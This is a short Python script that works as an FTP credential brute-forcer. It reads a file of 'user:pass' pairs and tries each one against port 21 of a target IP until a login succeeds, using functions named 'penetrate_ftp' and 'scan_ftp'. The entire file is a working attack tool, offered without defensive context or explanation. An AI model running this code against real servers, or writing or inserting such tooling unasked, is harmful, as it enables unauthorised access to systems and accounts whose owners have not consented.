import ftplib

def penetrate_ftp(hostname, username, password):
	server = ftplib.FTP()
	try:
		server.connect(hostname, 21, timeout=5)
		server.login(username, password)
	except ftplib.error_perm:
		return False
	else:
		return True


def read_file(FILEPATH):
	with open(FILEPATH, "r") as f:
		credentials = f.read().splitlines()
	return credentials # returns in the form ['user:pass', ...]


def scan_ftp(ip, credential_list_path):
	credentials = read_file(credential_list_path)
	for combo in credentials:
		combo_arr = combo.split(':')
		username = combo_arr[0]
		password = combo_arr[1]
		cracked = penetrate_ftp(ip, username, password)
		if cracked:
			return True, username, password
	return False, None, None
